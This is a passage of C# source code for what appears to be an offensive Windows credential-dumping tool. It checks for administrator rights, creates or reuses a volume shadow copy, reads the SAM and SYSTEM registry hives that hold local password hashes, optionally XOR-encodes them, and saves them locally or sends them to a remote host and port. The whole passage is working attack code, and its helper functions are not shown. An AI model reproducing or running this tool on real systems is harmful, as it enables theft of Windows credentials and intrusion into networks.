        Console.WriteLine("  --disk DISK            Disk for shadow copy (default: C:\\)");
        Console.WriteLine("  --help                 Show this help");
        Environment.Exit(0);
    }

    private static void ParseArguments(string[] args,
        out string outputDir,
        out string diskToShadow,
        out bool xorEncode,
        out bool saveLocally,
        out bool sendRemotely,
        out string keyXor,
        out string host,
        out int port)
    {
        // Valores por defecto
        outputDir = "C:\\Windows\\tasks";
        diskToShadow = "C:\\";
        xorEncode = false;
        saveLocally = false;
        sendRemotely = false;
        keyXor = "SAMDump2025";
        host = "127.0.0.1";
        port = 7777;

        for (int i = 0; i < args.Length; i++)
        {
            if (args[i] == "--output-dir" && i + 1 < args.Length)
            {
                outputDir = args[++i];
            }
            else if (args[i] == "--disk" && i + 1 < args.Length)
            {
                diskToShadow = args[++i];
            }
            else if (args[i] == "--xor-key" && i + 1 < args.Length)
            {
                keyXor = args[++i];
                xorEncode = true;
            }
            else if (args[i] == "--save-local")
            {
                if (i + 1 < args.Length && !args[i + 1].StartsWith("--"))
                {
                    string value = args[++i].ToLower();
                    saveLocally = (value == "true" || value == "1" || value == "yes");
                }
                else
                {
                    saveLocally = true;
                }
            }
            else if (args[i] == "--send-remote")
            {
                if (i + 1 < args.Length && !args[i + 1].StartsWith("--"))
                {
                    string value = args[++i].ToLower();
                    sendRemotely = (value == "true" || value == "1" || value == "yes");
                }
                else
                {
                    sendRemotely = true;
                }
            }
            else if (args[i] == "--xor-encode")
            {
                if (i + 1 < args.Length && !args[i + 1].StartsWith("--"))
                {
                    string value = args[++i].ToLower();
                    xorEncode = (value == "true" || value == "1" || value == "yes");
                }
                else
                {
                    xorEncode = true;
                }
            }
            else if (args[i] == "--host" && i + 1 < args.Length)
            {
                host = args[++i];
            }
            else if (args[i] == "--port" && i + 1 < args.Length)
            {
                port = int.Parse(args[++i]);
            }
            else if (args[i] == "--help")
            {
                PrintHelp();
            }
        }

        if (DEBUG_LEVEL >= 2)
        {
            Console.WriteLine("Configuration:");
            Console.WriteLine($"  Output Dir: {outputDir}");
            Console.WriteLine($"  Disk: {diskToShadow}");
            Console.WriteLine($"  XOR Encode: {xorEncode}");
            Console.WriteLine($"  XOR Key: {keyXor}");
            Console.WriteLine($"  Save Locally: {saveLocally}");
            Console.WriteLine($"  Send Remotely: {sendRemotely}");
            Console.WriteLine($"  Host: {host}");
            Console.WriteLine($"  Port: {port}");
        }
    }


    static void Main(string[] args)
    {
        if (!IsAdministrator())
        {
            Console.WriteLine("ERROR: Administrator privileges required");
            return;
        }

        string outputDir, diskToShadow, keyXor, host;
        bool xorEncode, saveLocally, sendRemotely;
        int port;

        ParseArguments(args, out outputDir, out diskToShadow, out xorEncode,
            out saveLocally, out sendRemotely, out keyXor, out host, out port);

        if (!saveLocally && !sendRemotely)
        {
            PrintHelp();
        }

        string shadowCopyBasePath;
        bool newShadowCreated = false;

        if (ListShadows(out shadowCopyBasePath))
        {
            if (DEBUG_LEVEL >= 1)
            {
                Console.WriteLine($"[+] Shadow Copy found: {shadowCopyBasePath}");
            }
        }
        else
        {
            if (DEBUG_LEVEL >= 1)
            {
                Console.WriteLine("[+] No Shadow Copies found: Creating a new one.");
            }

            int hr = CreateShadow(diskToShadow, out shadowCopyBasePath);

            if (!string.IsNullOrEmpty(shadowCopyBasePath))
            {
                Console.WriteLine($"[+] Shadow copy created: {shadowCopyBasePath}");
                newShadowCreated = true;
            }
            else
            {
                Console.WriteLine("\n[-] Failed to create a Shadow copy.");
                return;
            }
        }

        shadowCopyBasePath = shadowCopyBasePath.Replace("\\\\?\\", "\\??\\");

        string samPath = "\\windows\\system32\\config\\sam";
        string systemPath = "\\windows\\system32\\config\\system";
        string fullPathSam = shadowCopyBasePath + samPath;
        string fullPathSystem = shadowCopyBasePath + systemPath;

        List<byte> samBytes = ReadFile(fullPathSam, true);
        List<byte> systemBytes = ReadFile(fullPathSystem, true);

        if (newShadowCreated)
        {
            List<byte> samBytes2 = ReadFile(fullPathSam, false);
            samBytes = samBytes2;
            List<byte> systemBytes2 = ReadFile(fullPathSystem, false);
            systemBytes = systemBytes2;
        }

        if (xorEncode)
        {
            List<byte> encodedSamBytes = EncodeBytes(samBytes, keyXor);
            List<byte> encodedSystemBytes = EncodeBytes(systemBytes, keyXor);
            samBytes = encodedSamBytes;
            systemBytes = encodedSystemBytes;

            if (DEBUG_LEVEL >= 1)
            {
                Console.WriteLine("[+] XOR-encoded SAM and SYSTEM content");
            }
        }

        if (saveLocally)
        {
            string samFname = "\\sam.txt";
            string systemFname = "\\system.txt";

            if (SaveFilesLocally(samBytes, systemBytes, outputDir, samFname, systemFname))
            {
                if (DEBUG_LEVEL >= 1)
                {
                    Console.WriteLine("[+] Success saving files locally");
                }
            }
            else
            {
                Console.WriteLine("[-] Error saving files locally");
            }
        }

        if (sendRemotely)
        {
            if (SendFilesRemotely(samBytes, systemBytes, host, port))
            {
                if (DEBUG_LEVEL >= 1)
                {
                    Console.WriteLine("[+] Success sending files");
                }
            }
            else
            {
                Console.WriteLine("[-] Error sending files");
            }
        }
    }
}